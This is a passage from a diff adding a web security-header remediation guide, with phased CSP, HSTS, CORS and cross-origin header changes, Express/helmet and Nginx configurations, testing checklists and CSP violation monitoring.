+Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self'; report-uri /csp-report
+```
+
+**Monitor violations for 7 days**
+
+**Week 2: Enforce Mode**
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; ...
+```
+
+**Testing**:
+```bash
+# Check CSP header
+curl -I https://example.com | grep -i content-security-policy
+
+# Verify CSP effectiveness
+# Open DevTools Console, check for CSP violations
+```
+
+**Risk**: High (may break functionality)
+**Estimated Time**: 3-5 days (including testing)
+
+---
+
+#### 4. Add Permissions-Policy
+```http
+Permissions-Policy: geolocation=(), microphone=(), camera=()
+```
+
+**Risk**: Low
+**Estimated Time**: 1 hour
+
+---
+
+### Phase 3: Medium Priority (Within 30 days)
+
+#### 5. Implement Cross-Origin Headers
+```http
+Cross-Origin-Resource-Policy: same-origin
+Cross-Origin-Embedder-Policy: require-corp
+Cross-Origin-Opener-Policy: same-origin
+```
+
+**Risk**: Medium
+**Estimated Time**: 2-3 days
+
+---
+
+#### 6. Remove Deprecated Headers
+```javascript
+// Remove X-XSS-Protection
+- X-XSS-Protection: 1; mode=block
+```
+
+**Risk**: Low
+**Estimated Time**: 30 minutes
+
+---
+
+## Implementation Code
+
+### Complete Express.js Configuration
+```javascript
+const express = require('express');
+const helmet = require('helmet');
+const app = express();
+
+// Generate nonce for CSP
+app.use((req, res, next) => {
+  res.locals.nonce = require('crypto').randomBytes(16).toString('base64');
+  next();
+});
+
+// Security headers
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", "https:", "data:"],
+      fontSrc: ["'self'"],
+      connectSrc: ["'self'", "https://api.example.com"],
+      frameAncestors: ["'none'"],
+      baseUri: ["'self'"],
+      formAction: ["'self'"],
+      upgradeInsecureRequests: []
+    }
+  },
+  hsts: {
+    maxAge: 31536000,
+    includeSubDomains: true,
+    preload: true
+  },
+  frameguard: {
+    action: 'deny'
+  },
+  noSniff: true,
+  xssFilter: false,  // Deprecated, use CSP
+  referrerPolicy: {
+    policy: 'strict-origin-when-cross-origin'
+  },
+  crossOriginEmbedderPolicy: true,
+  crossOriginOpenerPolicy: { policy: 'same-origin' },
+  crossOriginResourcePolicy: { policy: 'same-origin' }
+}));
+
+// Permissions Policy
+app.use((req, res, next) => {
+  res.setHeader('Permissions-Policy',
+    'geolocation=(), microphone=(), camera=(), payment=(), usb=()'
+  );
+  next();
+});
+
+// CORS configuration
+const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
+app.use((req, res, next) => {
+  const origin = req.headers.origin;
+  if (allowedOrigins.includes(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+  }
+  next();
+});
+
+// CSP violation reporting
+app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
+  console.log('CSP Violation:', req.body);
+  res.status(204).end();
+});
+
+app.listen(3000);
+```
+
+### Complete Nginx Configuration
+```nginx
+server {
+    listen 443 ssl http2;
+    server_name example.com;
+
+    # SSL configuration
+    ssl_certificate /path/to/cert.pem;
+    ssl_certificate_key /path/to/key.pem;
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers HIGH:!aNULL:!MD5;
+
+    # Security Headers
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; font-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests" always;
+    add_header X-Frame-Options "DENY" always;
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+    add_header Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=(), usb=()" always;
+    add_header Cross-Origin-Resource-Policy "same-origin" always;
+    add_header Cross-Origin-Embedder-Policy "require-corp" always;
+    add_header Cross-Origin-Opener-Policy "same-origin" always;
+
+    # CORS
+    set $cors_origin "";
+    if ($http_origin ~ "^https://(app|admin)\.example\.com$") {
+        set $cors_origin $http_origin;
+    }
+    add_header Access-Control-Allow-Origin $cors_origin always;
+    add_header Access-Control-Allow-Credentials true always;
+
+    location / {
+        proxy_pass http://localhost:3000;
+    }
+}
+
+# HTTP to HTTPS redirect
+server {
+    listen 80;
+    server_name example.com;
+    return 301 https://$server_name$request_uri;
+}
+```
+
+---
+
+## Testing Checklist
+
+### Automated Testing
+- [ ] Run header scanner tool
+- [ ] Check Mozilla Observatory score
+- [ ] Verify SecurityHeaders.com grade
+- [ ] Test with browser DevTools
+- [ ] Automated tests in CI/CD
+
+### Manual Testing
+- [ ] Verify HTTPS redirect
+- [ ] Test CSP violations in console
+- [ ] Check frame embedding
+- [ ] Test CORS from allowed/disallowed origins
+- [ ] Verify API access restrictions
+
+### Browser Compatibility
+- [ ] Chrome/Edge (latest)
+- [ ] Firefox (latest)
+- [ ] Safari (latest)
+- [ ] Mobile browsers
+
+---
+
+## Monitoring and Maintenance
+
+### CSP Violation Monitoring
+```javascript
+// Log violations
+app.post('/csp-report', (req, res) => {
+  const violation = req.body['csp-report'];
+  logger.warn('CSP Violation', {
+    blockedURI: violation['blocked-uri'],
+    violatedDirective: violation['violated-directive'],
+    documentURI: violation['document-uri']
+  });
+  res.status(204).end();
+});
+
+// Alert on critical violations
+if (violation['violated-directive'].includes('script-src')) {
+  alertSecurityTeam(violation);
+}
+```
+
+### Regular Audits
+- Weekly: Automated header scanning
+- Monthly: Manual security review
+- Quarterly: Full security assessment
+- After changes: Regression testing
+
+---
+
+## Best Practices
+
+### Header Implementation
+- ✅ Use security header middleware (helmet, etc.)
+- ✅ Apply headers at infrastructure level (CDN, load balancer)
+- ✅ Test in staging before production
+- ✅ Start with report-only mode for CSP
+- ✅ Monitor violations and adjust policies
+- ✅ Document header configurations
+
+### CSP Best Practices
+- ✅ Start strict, loosen as needed
+- ✅ Use nonces or hashes for inline scripts
+- ✅ Avoid 'unsafe-inline' and 'unsafe-eval'
+- ✅ Use report-uri or report-to
+- ✅ Regularly review and update policies
+
+### HSTS Best Practices
+- ✅ Start with short max-age for testing
+- ✅ Ensure HTTPS works on all subdomains before includeSubDomains
+- ✅ Submit to HSTS preload list
+- ✅ Plan for long-term HTTPS support
+
+---
+
+## Summary
+
+**Current Grade**: F (45/100)
+**Target Grade**: A+ (95+/100)
+**Estimated Effort**: 2-3 weeks
+**Priority**: HIGH - Critical vulnerabilities present
+
+**Immediate Actions**:
+1. Fix CORS misconfiguration (today)
+2. Implement HSTS (today)
+3. Deploy CSP in report-only mode (this week)
+4. Enforce CSP (next week)
+
+**Expected Grade After Fixes**: A (90+/100)
+```
+
+## Notes
+
+- Test headers in staging first
+- Use report-only mode for CSP initially
+- Monitor CSP violations before enforcing
+- Balance security with functionality
+- Keep headers updated with best practices
+- Regular security audits recommended
+- Document all header configurations
+- Train team on header security
+- Use automated tools for continuous monitoring
+- Review headers after major changes
